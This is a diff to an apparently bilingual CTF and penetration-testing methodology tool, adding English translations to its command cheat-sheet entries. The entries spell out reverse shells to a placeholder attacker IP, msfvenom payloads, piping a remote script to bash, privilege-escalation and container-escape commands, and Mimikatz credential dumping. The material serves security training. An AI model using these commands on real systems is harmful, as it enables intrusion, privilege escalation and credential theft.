+      { label: "Chercher des exploits", label_en: "Search for exploits", cmd: "searchsploit SERVICE VERSION\n# Ex: searchsploit apache 2.4.49", cmd_en: "searchsploit SERVICE VERSION\n# E.g.: searchsploit apache 2.4.49" },
+      { label: "Copier l'exploit", label_en: "Copy the exploit", cmd: "searchsploit -m EXPLOIT_ID\n# Examiner le code avant d'exécuter !", cmd_en: "searchsploit -m EXPLOIT_ID\n# Review the code before running it!" },
       { label: "Chercher dans Metasploit", label_en: "Search in Metasploit", cmd: "msfconsole\nsearch type:exploit name:SERVICE\nuse MODULE_PATH\nshow options\nset RHOSTS TARGET_IP\nset LHOST YOUR_IP\nrun" },
-      { label: "Chercher sur GitHub", label_en: "Search on GitHub", cmd: "# google : CVE-2021-XXXXX PoC github\n# exploit-db.com" }
+      { label: "Chercher sur GitHub", label_en: "Search on GitHub", cmd: "# google : CVE-2021-XXXXX PoC github\n# exploit-db.com", cmd_en: "# google: CVE-2021-XXXXX PoC github\n# exploit-db.com" }
     ],
     lookfor: ["Type d'exploit : Remote vs Local, Authenticated vs Unauthenticated", "Fiabilité et notes de l'exploit"],
     lookfor_en: ["Exploit type: Remote vs Local, Authenticated vs Unauthenticated", "Exploit reliability and notes"],
@@ -1010,13 +1010,13 @@ const NODES = {
     description: "Exécution de code à distance confirmée. Établir un shell interactif stable.",
     description_en: "Remote code execution confirmed. Establish a stable interactive shell.",
     commands: [
-      { label: "Préparer listener", label_en: "Set up listener", cmd: "nc -lvnp 4444\n# Ou avec rlwrap pour historique : rlwrap nc -lvnp 4444" },
+      { label: "Préparer listener", label_en: "Set up listener", cmd: "nc -lvnp 4444\n# Ou avec rlwrap pour historique : rlwrap nc -lvnp 4444", cmd_en: "nc -lvnp 4444\n# Or with rlwrap for history: rlwrap nc -lvnp 4444" },
       { label: "Reverse shell Bash", label_en: "Bash reverse shell", cmd: "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" },
       { label: "Reverse shell Python", label_en: "Python reverse shell", cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
       { label: "Reverse shell PHP", label_en: "PHP reverse shell", cmd: "php -r '$sock=fsockopen(\"YOUR_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
       { label: "Reverse shell PowerShell", label_en: "PowerShell reverse shell", cmd: "powershell -nop -c \"$client=New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" },
-      { label: "msfvenom payload", label_en: "msfvenom payload", cmd: "# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell\n# Windows EXE\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe" },
-      { label: "Revshells.com — générateur en ligne", label_en: "Revshells.com — online generator", cmd: "# https://www.revshells.com/ — tous les formats possibles" }
+      { label: "msfvenom payload", label_en: "msfvenom payload", cmd: "# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell\n# Windows EXE\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe", cmd_en: "# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell\n# Windows EXE\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe" },
+      { label: "Revshells.com — générateur en ligne", label_en: "Revshells.com — online generator", cmd: "# https://www.revshells.com/ — tous les formats possibles", cmd_en: "# https://www.revshells.com/ — all possible formats" }
     ],
     lookfor: ["Connexion entrante sur votre listener nc", "Prompt shell affiché"],
     lookfor_en: ["Incoming connection on your nc listener", "Shell prompt displayed"],
@@ -1041,10 +1041,10 @@ const NODES = {
     description: "Un reverse shell basique est instable. Le rendre interactif avec PTY.",
     description_en: "A basic reverse shell is unstable. Make it interactive with PTY.",
     commands: [
-      { label: "Méthode Python PTY (meilleure)", label_en: "Python PTY method (best)", cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Puis : Ctrl+Z\nstty raw -echo; fg\n# Puis dans le shell :\nexport TERM=xterm" },
-      { label: "Alternative avec script", label_en: "Alternative with script", cmd: "script /dev/null -c bash\n# Ctrl+Z, stty raw -echo, fg" },
-      { label: "Ajuster la taille du terminal", label_en: "Adjust terminal size", cmd: "# Sur votre machine :\nstty size  # note les valeurs rows cols\n# Dans le reverse shell :\nstty rows 38 cols 116" },
-      { label: "Upgrade vers SSH si possible", label_en: "Upgrade to SSH if possible", cmd: "# Sur la cible, générer clé et ajouter au authorized_keys\nssh-keygen\ncat id_rsa.pub >> ~/.ssh/authorized_keys\n# Récupérer id_rsa et se connecter en SSH" }
+      { label: "Méthode Python PTY (meilleure)", label_en: "Python PTY method (best)", cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Puis : Ctrl+Z\nstty raw -echo; fg\n# Puis dans le shell :\nexport TERM=xterm", cmd_en: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Then: Ctrl+Z\nstty raw -echo; fg\n# Then in the shell:\nexport TERM=xterm" },
+      { label: "Alternative avec script", label_en: "Alternative with script", cmd: "script /dev/null -c bash\n# Ctrl+Z, stty raw -echo, fg", cmd_en: "script /dev/null -c bash\n# Ctrl+Z, stty raw -echo, fg" },
+      { label: "Ajuster la taille du terminal", label_en: "Adjust terminal size", cmd: "# Sur votre machine :\nstty size  # note les valeurs rows cols\n# Dans le reverse shell :\nstty rows 38 cols 116", cmd_en: "# On your machine:\nstty size  # note the rows cols values\n# In the reverse shell:\nstty rows 38 cols 116" },
+      { label: "Upgrade vers SSH si possible", label_en: "Upgrade to SSH if possible", cmd: "# Sur la cible, générer clé et ajouter au authorized_keys\nssh-keygen\ncat id_rsa.pub >> ~/.ssh/authorized_keys\n# Récupérer id_rsa et se connecter en SSH", cmd_en: "# On the target, generate a key and add to authorized_keys\nssh-keygen\ncat id_rsa.pub >> ~/.ssh/authorized_keys\n# Retrieve id_rsa and connect via SSH" }
     ],
     lookfor: ["Shell interactif avec Ctrl+C qui ne tue pas le shell", "Tab completion fonctionnel"],
     lookfor_en: ["Interactive shell where Ctrl+C does not kill the shell", "Tab completion working"],
@@ -1061,7 +1061,7 @@ const NODES = {
     description_en: "Windows shell obtained. Reconnaissance and next steps.",
     commands: [
       { label: "Informations système", label_en: "System information", cmd: "whoami\nsysteminfo\nwhoami /priv\nnet user\nnet localgroup administrators" },
-      { label: "Upgrade vers Meterpreter", label_en: "Upgrade to Meterpreter", cmd: "# Dans msfconsole, après shell basique :\nCtrl+Z\nsessions -u SESSION_ID" },
+      { label: "Upgrade vers Meterpreter", label_en: "Upgrade to Meterpreter", cmd: "# Dans msfconsole, après shell basique :\nCtrl+Z\nsessions -u SESSION_ID", cmd_en: "# In msfconsole, after a basic shell:\nCtrl+Z\nsessions -u SESSION_ID" },
       { label: "Upgrade vers PowerShell", label_en: "Upgrade to PowerShell", cmd: "powershell -ep bypass" },
       { label: "Chercher flags rapidement", label_en: "Quickly look for flags", cmd: "dir C:\\Users\\*\\Desktop\\* /s\ntype C:\\Users\\USER\\Desktop\\user.txt" }
     ],
@@ -1082,8 +1082,8 @@ const NODES = {
     commands: [
       { label: "Tester SSH", label_en: "Test SSH", cmd: "ssh USER@TARGET_IP" },
       { label: "Tester sur tous les services", label_en: "Test against all services", cmd: "crackmapexec smb TARGET_IP -u USER -p PASSWORD\ncrackmapexec ssh TARGET_IP -u USER -p PASSWORD\ncrackmapexec winrm TARGET_IP -u USER -p PASSWORD" },
-      { label: "Tester sur l'interface web", label_en: "Test on the web interface", cmd: "# Se connecter sur tous les login forms trouvés" },
-      { label: "Chercher d'autres services avec les creds", label_en: "Try creds on other services", cmd: "# Su vers d'autres utilisateurs si sur Linux :\nsu - OTHER_USER\n# Utiliser pour MySQL, FTP, etc." }
+      { label: "Tester sur l'interface web", label_en: "Test on the web interface", cmd: "# Se connecter sur tous les login forms trouvés", cmd_en: "# Try logging in on all login forms found" },
+      { label: "Chercher d'autres services avec les creds", label_en: "Try creds on other services", cmd: "# Su vers d'autres utilisateurs si sur Linux :\nsu - OTHER_USER\n# Utiliser pour MySQL, FTP, etc.", cmd_en: "# Switch to other users if on Linux:\nsu - OTHER_USER\n# Use for MySQL, FTP, etc." }
     ],
     lookfor: ["Password reuse entre services", "Accès à des services précédemment inaccessibles"],
     lookfor_en: ["Password reuse across services", "Access to previously inaccessible services"],
@@ -1104,8 +1104,8 @@ const NODES = {
     description: "Cartographier les vecteurs d'escalade de privilèges disponibles.",
     description_en: "Map available privilege escalation vectors.",
     commands: [
-      { label: "LinPEAS — outil automatique (recommandé)", label_en: "LinPEAS — automated tool (recommended)", cmd: "# Transférer sur la cible :\ncurl http://YOUR_IP:8000/linpeas.sh | bash\n# Ou :\nwget http://YOUR_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh" },
-      { label: "Servir linpeas depuis votre machine", label_en: "Serve linpeas from your machine", cmd: "python3 -m http.server 8000  # Dans le dossier où se trouve linpeas.sh" },
+      { label: "LinPEAS — outil automatique (recommandé)", label_en: "LinPEAS — automated tool (recommended)", cmd: "# Transférer sur la cible :\ncurl http://YOUR_IP:8000/linpeas.sh | bash\n# Ou :\nwget http://YOUR_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh", cmd_en: "# Transfer to the target:\ncurl http://YOUR_IP:8000/linpeas.sh | bash\n# Or:\nwget http://YOUR_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh" },
+      { label: "Servir linpeas depuis votre machine", label_en: "Serve linpeas from your machine", cmd: "python3 -m http.server 8000  # Dans le dossier où se trouve linpeas.sh", cmd_en: "python3 -m http.server 8000  # In the folder where linpeas.sh is located" },
       { label: "Vérifications manuelles rapides", label_en: "Quick manual checks", cmd: "sudo -l\nfind / -perm -u=s -type f 2>/dev/null\ncrontab -l && cat /etc/crontab\nenv\ncat /etc/passwd | grep -v nologin" },
       { label: "Capabilities", label_en: "Capabilities", cmd: "getcap -r / 2>/dev/null" },
       { label: "Fichiers world-writable", label_en: "World-writable files", cmd: "find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys" }
@@ -1151,8 +1151,8 @@ const NODES = {
     description_en: "sudo -l reveals binaries executable as root → GTFOBins to escape them.",
     commands: [
       { label: "Voir les droits sudo", label_en: "Check sudo rights", cmd: "sudo -l" },
-      { label: "Exemples GTFOBins courants", label_en: "Common GTFOBins examples", cmd: "# vim\nsudo vim -c ':!/bin/bash'\n# less\nsudo less /etc/passwd  # puis : !bash\n# find\nsudo find . -exec /bin/bash \\; -quit\n# python\nsudo python3 -c 'import os;os.system(\"/bin/bash\")'\n# nmap\nsudo nmap --interactive  # puis : !bash (vieux nmap)\n# awk\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n# perl\nsudo perl -e 'exec \"/bin/bash\";'\n# env\nsudo env /bin/bash" },
-      { label: "Script autorisé avec wildcard", label_en: "Allowed script with wildcard", cmd: "# Si sudo /opt/script.sh avec * dans path\n# Créer fichier nommé '-e sh' dans le répertoire\ntouch -- '-e sh'" }
+      { label: "Exemples GTFOBins courants", label_en: "Common GTFOBins examples", cmd: "# vim\nsudo vim -c ':!/bin/bash'\n# less\nsudo less /etc/passwd  # puis : !bash\n# find\nsudo find . -exec /bin/bash \\; -quit\n# python\nsudo python3 -c 'import os;os.system(\"/bin/bash\")'\n# nmap\nsudo nmap --interactive  # puis : !bash (vieux nmap)\n# awk\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n# perl\nsudo perl -e 'exec \"/bin/bash\";'\n# env\nsudo env /bin/bash", cmd_en: "# vim\nsudo vim -c ':!/bin/bash'\n# less\nsudo less /etc/passwd  # then: !bash\n# find\nsudo find . -exec /bin/bash \\; -quit\n# python\nsudo python3 -c 'import os;os.system(\"/bin/bash\")'\n# nmap\nsudo nmap --interactive  # then: !bash (old nmap)\n# awk\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n# perl\nsudo perl -e 'exec \"/bin/bash\";'\n# env\nsudo env /bin/bash" },
+      { label: "Script autorisé avec wildcard", label_en: "Allowed script with wildcard", cmd: "# Si sudo /opt/script.sh avec * dans path\n# Créer fichier nommé '-e sh' dans le répertoire\ntouch -- '-e sh'", cmd_en: "# If sudo /opt/script.sh with * in the path\n# Create a file named '-e sh' in the directory\ntouch -- '-e sh'" }
     ],
     lookfor: ["NOPASSWD dans sudo -l", "Binaire listé sur GTFOBins"],
     lookfor_en: ["NOPASSWD in sudo -l", "Binary listed on GTFOBins"],
@@ -1177,9 +1177,9 @@ const NODES = {
     description_en: "Binaries with the SUID bit run with the owner's privileges (often root).",
     commands: [
       { label: "Trouver les SUID", label_en: "Find SUID binaries", cmd: "find / -perm -u=s -type f 2>/dev/null" },
-      { label: "Chercher sur GTFOBins", label_en: "Search GTFOBins", cmd: "# Pour chaque binaire trouvé : gtfobins.github.io\n# Exemple : /usr/bin/find\nfind . -exec /bin/sh -p \\; -quit" },
+      { label: "Chercher sur GTFOBins", label_en: "Search GTFOBins", cmd: "# Pour chaque binaire trouvé : gtfobins.github.io\n# Exemple : /usr/bin/find\nfind . -exec /bin/sh -p \\; -quit", cmd_en: "# For each binary found: gtfobins.github.io\n# Example: /usr/bin/find\nfind . -exec /bin/sh -p \\; -quit" },
       { label: "SUID personnalisé — analyser le binaire", label_en: "Custom SUID — analyze the binary", cmd: "strings /path/to/suid_binary\nltrace /path/to/suid_binary\nstrace /path/to/suid_binary" },
-      { label: "PATH hijacking si appel système relatif", label_en: "PATH hijacking if relative system call", cmd: "# Si le binaire appelle 'service' sans chemin absolu\nexport PATH=/tmp:$PATH\necho '/bin/bash -p' > /tmp/service\nchmod +x /tmp/service\n/path/to/suid_binary" }
+      { label: "PATH hijacking si appel système relatif", label_en: "PATH hijacking if relative system call", cmd: "# Si le binaire appelle 'service' sans chemin absolu\nexport PATH=/tmp:$PATH\necho '/bin/bash -p' > /tmp/service\nchmod +x /tmp/service\n/path/to/suid_binary", cmd_en: "# If the binary calls 'service' without an absolute path\nexport PATH=/tmp:$PATH\necho '/bin/bash -p' > /tmp/service\nchmod +x /tmp/service\n/path/to/suid_binary" }
     ],
     lookfor: [
       "Binaires standards avec SUID non-attendu (cp, vim, python, etc.)",
@@ -1212,7 +1212,7 @@ const NODES = {
     description_en: "Scripts periodically executed as root. If writable → command injection.",
     commands: [
       { label: "Voir les cron jobs", label_en: "View cron jobs", cmd: "crontab -l\ncat /etc/crontab\nls -la /etc/cron*\nfind / -name '*.cron' 2>/dev/null" },
-      { label: "Surveiller les processus (pspy recommandé)", label_en: "Monitor processes (pspy recommended)", cmd: "# Télécharger pspy sur la cible\nwget http://YOUR_IP:8000/pspy64\nchmod +x pspy64\n./pspy64" },
+      { label: "Surveiller les processus (pspy recommandé)", label_en: "Monitor processes (pspy recommended)", cmd: "# Télécharger pspy sur la cible\nwget http://YOUR_IP:8000/pspy64\nchmod +x pspy64\n./pspy64", cmd_en: "# Download pspy to the target\nwget http://YOUR_IP:8000/pspy64\nchmod +x pspy64\n./pspy64" },
       { label: "Modifier le script si writable", label_en: "Modify the script if writable", cmd: "echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /path/to/script.sh" },
       { label: "Si le script source un fichier modifiable", label_en: "If the script sources a writable file", cmd: "echo 'chmod +s /bin/bash' > /path/to/sourced_file.sh" }
     ],
@@ -1247,7 +1247,7 @@ const NODES = {
     description_en: "Linux capabilities grant specific powers to binaries without full SUID.",
     commands: [
       { label: "Lister les capabilities", label_en: "List capabilities", cmd: "getcap -r / 2>/dev/null" },
-      { label: "python3 avec cap_setuid", label_en: "python3 with cap_setuid", cmd: "# Si python3 a cap_setuid+ep :\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" },
+      { label: "python3 avec cap_setuid", label_en: "python3 with cap_setuid", cmd: "# Si python3 a cap_setuid+ep :\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", cmd_en: "# If python3 has cap_setuid+ep:\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" },
       { label: "vim avec cap_setuid", label_en: "vim with cap_setuid", cmd: "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-c\",\"reset; exec sh\")'" },
       { label: "perl avec cap_setuid", label_en: "perl with cap_setuid", cmd: "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'" }
     ],
@@ -1268,7 +1268,7 @@ const NODES = {
       { label: "Vérifier groupe docker", label_en: "Check docker group", cmd: "id | grep docker\ngroups" },
       { label: "Escape docker via image existante", label_en: "Docker escape via existing image", cmd: "docker images\ndocker run -v /:/mnt --rm -it IMAGE_NAME chroot /mnt sh" },
       { label: "Escape docker si aucune image", label_en: "Docker escape with no existing image", cmd: "docker pull alpine\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
-      { label: "LXC escape (groupe lxd)", label_en: "LXC escape (lxd group)", cmd: "# Import image alpine\nlxc image import ./alpine.tar.gz --alias alpine\nlxc init alpine privesc -c security.privileged=true\nlxc config device add privesc host-root disk source=/ path=/r recursive=true\nlxc start privesc\nlxc exec privesc -- /bin/sh\nchroot /r sh" }
+      { label: "LXC escape (groupe lxd)", label_en: "LXC escape (lxd group)", cmd: "# Import image alpine\nlxc image import ./alpine.tar.gz --alias alpine\nlxc init alpine privesc -c security.privileged=true\nlxc config device add privesc host-root disk source=/ path=/r recursive=true\nlxc start privesc\nlxc exec privesc -- /bin/sh\nchroot /r sh", cmd_en: "# Import alpine image\nlxc image import ./alpine.tar.gz --alias alpine\nlxc init alpine privesc -c security.privileged=true\nlxc config device add privesc host-root disk source=/ path=/r recursive=true\nlxc start privesc\nlxc exec privesc -- /bin/sh\nchroot /r sh" }
     ],
     lookfor: ["id révèle groupe docker ou lxd/lxc"],
     lookfor_en: ["id reveals docker or lxd/lxc group membership"],
@@ -1285,7 +1285,7 @@ const NODES = {
     description_en: "Exploit a Linux kernel vulnerability to get root. Last resort.",
     commands: [
       { label: "Version du kernel", label_en: "Kernel version", cmd: "uname -r\nuname -a\ncat /proc/version" },
-      { label: "Chercher exploits kernel", label_en: "Search kernel exploits", cmd: "searchsploit linux kernel 4.15\n# Linux Exploit Suggester :\nwget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh\nbash linux-exploit-suggester.sh" },
+      { label: "Chercher exploits kernel", label_en: "Search kernel exploits", cmd: "searchsploit linux kernel 4.15\n# Linux Exploit Suggester :\nwget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh\nbash linux-exploit-suggester.sh", cmd_en: "searchsploit linux kernel 4.15\n# Linux Exploit Suggester:\nwget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh\nbash linux-exploit-suggester.sh" },
       { label: "DirtyCow (CVE-2016-5195) — kernel < 4.8.3", label_en: "DirtyCow (CVE-2016-5195) — kernel < 4.8.3", cmd: "gcc -pthread dirty.c -o dirty -lcrypt\n./dirty PASSWORD" },
       { label: "DirtyPipe (CVE-2022-0847) — kernel 5.8-5.17", label_en: "DirtyPipe (CVE-2022-0847) — kernel 5.8-5.17", cmd: "gcc dirtypipe.c -o dirtypipe\n./dirtypipe /etc/passwd" }
     ],
@@ -1313,7 +1313,7 @@ const NODES = {
     description: "Identifier les vecteurs d'escalade sur Windows.",
     description_en: "Identify privilege escalation vectors on Windows.",
     commands: [
-      { label: "WinPEAS — outil automatique", label_en: "WinPEAS — automated tool", cmd: "# Transférer winpeas.exe sur la cible\ncurl http://YOUR_IP:8000/winPEASx64.exe -o C:\\Users\\Public\\wp.exe\nC:\\Users\\Public\\wp.exe" },
+      { label: "WinPEAS — outil automatique", label_en: "WinPEAS — automated tool", cmd: "# Transférer winpeas.exe sur la cible\ncurl http://YOUR_IP:8000/winPEASx64.exe -o C:\\Users\\Public\\wp.exe\nC:\\Users\\Public\\wp.exe", cmd_en: "# Transfer winpeas.exe to the target\ncurl http://YOUR_IP:8000/winPEASx64.exe -o C:\\Users\\Public\\wp.exe\nC:\\Users\\Public\\wp.exe" },
       { label: "Informations système", label_en: "System information", cmd: "systeminfo\nwhoami /priv\nwhoami /groups\nnet user\nnet localgroup administrators" },
       { label: "Services vulnérables", label_en: "Vulnerable services", cmd: "wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows'" },
       { label: "Vérifier SeImpersonatePrivilege", label_en: "Check SeImpersonatePrivilege", cmd: "whoami /priv | findstr 'SeImpersonate SeAssignPrimary'" },
@@ -1353,7 +1353,7 @@ const NODES = {
     description: "SeImpersonatePrivilege = escalade vers SYSTEM via usurpation de token.",
     description_en: "SeImpersonatePrivilege = escalation to SYSTEM via token impersonation.",
     commands: [
-      { label: "Identifier la version Windows", label_en: "Identify Windows version", cmd: "systeminfo | findstr 'OS Name'\n# Win 10/2019 → RoguePotato ou PrintSpoofer\n# Win 7/2016/2019 → JuicyPotato" },
+      { label: "Identifier la version Windows", label_en: "Identify Windows version", cmd: "systeminfo | findstr 'OS Name'\n# Win 10/2019 → RoguePotato ou PrintSpoofer\n# Win 7/2016/2019 → JuicyPotato", cmd_en: "systeminfo | findstr 'OS Name'\n# Win 10/2019 → RoguePotato or PrintSpoofer\n# Win 7/2016/2019 → JuicyPotato" },
       { label: "PrintSpoofer (recommandé, moderne)", label_en: "PrintSpoofer (recommended, modern)", cmd: "PrintSpoofer.exe -i -c cmd\nPrintSpoofer.exe -c \"cmd /c whoami\"" },
       { label: "RoguePotato", label_en: "RoguePotato", cmd: "RoguePotato.exe -r YOUR_IP -e \"cmd.exe /c whoami\" -l 9999" },
       { label: "JuicyPotato (Win 2016/2019 non patché)", label_en: "JuicyPotato (Win 2016/2019 unpatched)", cmd: "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}" },
@@ -1381,10 +1381,10 @@ const NODES = {
     description: "Unquoted service paths ou permissions faibles sur des services exécutés en SYSTEM.",
     description_en: "Unquoted service paths or weak permissions on services running as SYSTEM.",
     commands: [
-      { label: "Unquoted path — chemin du service", label_en: "Unquoted path — service path", cmd: "# Service path : C:\\Program Files\\My App\\service.exe\n# Tenter : C:\\Program.exe (si writable)" },
+      { label: "Unquoted path — chemin du service", label_en: "Unquoted path — service path", cmd: "# Service path : C:\\Program Files\\My App\\service.exe\n# Tenter : C:\\Program.exe (si writable)", cmd_en: "# Service path: C:\\Program Files\\My App\\service.exe\n# Try: C:\\Program.exe (if writable)" },
       { label: "Vérifier permissions du répertoire", label_en: "Check directory permissions", cmd: "icacls \"C:\\Program Files\\My App\"" },
-      { label: "Créer payload et placer", label_en: "Create payload and place it", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o Program.exe\n# Copier dans le répertoire d'unquoted path" },
-      { label: "Redémarrer le service (si droits)", label_en: "Restart the service (if rights)", cmd: "sc stop SERVICE_NAME\nsc start SERVICE_NAME\n# Ou attendre redémarrage système" }
+      { label: "Créer payload et placer", label_en: "Create payload and place it", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o Program.exe\n# Copier dans le répertoire d'unquoted path", cmd_en: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o Program.exe\n# Copy into the unquoted path directory" },
+      { label: "Redémarrer le service (si droits)", label_en: "Restart the service (if rights)", cmd: "sc stop SERVICE_NAME\nsc start SERVICE_NAME\n# Ou attendre redémarrage système", cmd_en: "sc stop SERVICE_NAME\nsc start SERVICE_NAME\n# Or wait for system reboot" }
     ],
     lookfor: ["Répertoire writable dans le chemin du service", "Service qui tourne en LocalSystem"],
     lookfor_en: ["Writable directory in the service path", "Service running as LocalSystem"],
@@ -1419,9 +1419,9 @@ const NODES = {
     description_en: "Retrieve Windows credentials to escalate privileges or move laterally.",
     commands: [
       { label: "Mimikatz (si SYSTEM)", label_en: "Mimikatz (if SYSTEM)", cmd: "mimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords\nlsadump::sam" },
-      { label: "Dump SAM avec reg save", label_en: "Dump SAM with reg save", cmd: "reg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\n# Puis transférer et analyser avec :\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL" },
+      { label: "Dump SAM avec reg save", label_en: "Dump SAM with reg save", cmd: "reg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\n# Puis transférer et analyser avec :\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL", cmd_en: "reg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\n# Then transfer and analyze with:\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL" },
       { label: "Chercher mots de passe dans fichiers", label_en: "Search passwords in files", cmd: "findstr /si 'password' *.txt *.xml *.ini *.config\nfindstr /si 'password' C:\\Users\\*" },
-      { label: "Credentials Manager", label_en: "Credentials Manager", cmd: "cmdkey /list\n# Pour utiliser un credential sauvegardé :\nrunas /savecred /user:DOMAIN\\USER cmd.exe" }
+      { label: "Credentials Manager", label_en: "Credentials Manager", cmd: "cmdkey /list\n# Pour utiliser un credential sauvegardé :\nrunas /savecred /user:DOMAIN\\USER cmd.exe", cmd_en: "cmdkey /list\n# To use a saved credential:\nrunas /savecred /user:DOMAIN\\USER cmd.exe" }
     ],
     lookfor: ["Hashes NTLM → pass-the-hash ou crackage", "Mots de passe en clair dans lsass", "Credentials sauvegardés"],
     lookfor_en: ["NTLM hashes → pass-the-hash or cracking", "Cleartext passwords in lsass", "Saved credentials"],
@@ -1440,7 +1440,7 @@ const NODES = {
     commands: [
       { label: "Chercher les flags", label_en: "Look for flags", cmd: "dir C:\\Users\\*\\Desktop\\*.txt /s\ntype C:\\Users\\Administrator\\Desktop\\root.txt\ntype C:\\Users\\*\\Desktop\\user.txt" },
       { label: "Dump toutes les credentials", label_en: "Dump all credentials", cmd: "mimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\nlsadump::secrets" },
-      { label: "Exfiltrer des fichiers", label_en: "Exfiltrate files", cmd: "# Via HTTP :\npython3 -m http.server 80  # sur votre machine\nInvoke-WebRequest -Uri http://YOUR_IP/file -OutFile file" }
+      { label: "Exfiltrer des fichiers", label_en: "Exfiltrate files", cmd: "# Via HTTP :\npython3 -m http.server 80  # sur votre machine\nInvoke-WebRequest -Uri http://YOUR_IP/file -OutFile file", cmd_en: "# Via HTTP:\npython3 -m http.server 80  # on your machine\nInvoke-WebRequest -Uri http://YOUR_IP/file -OutFile file" }
     ],
     lookfor: ["root.txt ou administrator.txt sur le Desktop de chaque user", "Autres machines dans le réseau (pivoting)"],
     lookfor_en: ["root.txt or administrator.txt on each user's Desktop", "Other machines in the network (pivoting)"],
@@ -1478,7 +1478,7 @@ const NODES = {
     description: "Vous avez pwned la machine. Récapitulatif de la méthodologie utilisée.",
     description_en: "You have pwned the machine. Summary of the methodology used.",
     commands: [
-      { label: "Écrire son writeup", label_en: "Write your writeup", cmd: "# Documenter :\n# 1. Vecteur d'entrée initial\n# 2. Chemin d'escalade\n# 3. Flags obtenus\n# 4. CVEs/techniques utilisées" }
+      { label: "Écrire son writeup", label_en: "Write your writeup", cmd: "# Documenter :\n# 1. Vecteur d'entrée initial\n# 2. Chemin d'escalade\n# 3. Flags obtenus\n# 4. CVEs/techniques utilisées", cmd_en: "# Document:\n# 1. Initial entry vector\n# 2. Escalation path\n# 3. Flags obtained\n# 4. CVEs/techniques used" }
     ],
     lookfor: [],
     tips: [
@@ -1545,8 +1545,8 @@ const NODES = {
       { label: "Zsteg — PNG/BMP LSB", label_en: "Zsteg — PNG/BMP LSB", cmd: "zsteg image.png\nzsteg -a image.png  # tous les tests" },
       { label: "Outguess", label_en: "Outguess", cmd: "outguess -r image.jpg output.txt" },
       { label: "LSB sur image — decoder manuellement", label_en: "LSB on image — decode manually", cmd: "python3 -c \"\nfrom PIL import Image\nimg = Image.open('image.png')\npixels = list(img.getdata())\nbits = ''.join([str(p[0] & 1) for p in pixels])\nprint(bytes([int(bits[i:i+8],2) for i in range(0,len(bits),8)])[:100])\n\"" },
-      { label: "Audio — Audacity (spectre)", label_en: "Audio — Audacity (spectrum)", cmd: "# Ouvrir dans Audacity > Changer en spectrogramme\n# Parfois le flag est visible dans les fréquences" },
-      { label: "Audio — Sonic Visualiser", label_en: "Audio — Sonic Visualiser", cmd: "sonic-visualiser audio.wav\n# Ajouter 'Spectrogram' view" }
